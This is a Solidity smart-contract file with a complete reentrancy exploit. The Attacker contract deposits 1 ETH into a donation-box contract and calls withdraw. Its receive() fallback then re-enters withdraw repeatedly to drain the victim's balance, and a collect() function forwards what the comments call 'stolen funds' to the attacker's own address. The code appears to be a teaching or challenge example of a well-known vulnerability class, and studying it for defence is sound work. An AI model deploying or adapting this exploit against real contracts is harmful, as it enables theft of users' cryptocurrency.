// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDonationBox {
    function donate() external payable;
    function withdraw() external;
}

contract Attacker {
    IDonationBox public victim;
    address public owner;

    constructor(address _victim) {
        victim = IDonationBox(_victim);
        owner = msg.sender;
    }

    // Start attack by donating 1 ether and then calling withdraw
    function attack() external payable {
        require(msg.value >= 1 ether, "need >=1 ETH to attack");
        // deposit 1 ETH to victim under this contract's address
        victim.donate{value: 1 ether}();
        // trigger withdraw which will call around via fallback()
        victim.withdraw();
    }

    // fallback triggered when victim sends ETH to this contract
    receive() external payable {
        // If victim still has at least 1 ETH, re-enter withdraw
        if (address(victim).balance >= 1 ether) {
            // re-enter
            victim.withdraw();
        }
    }

    // helper to view collected balance inside attacker contract
    function getBalances() external view returns (uint256) {
        return address(this).balance;
    }

    // withdraw stolen funds to EOA owner
    function collect() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
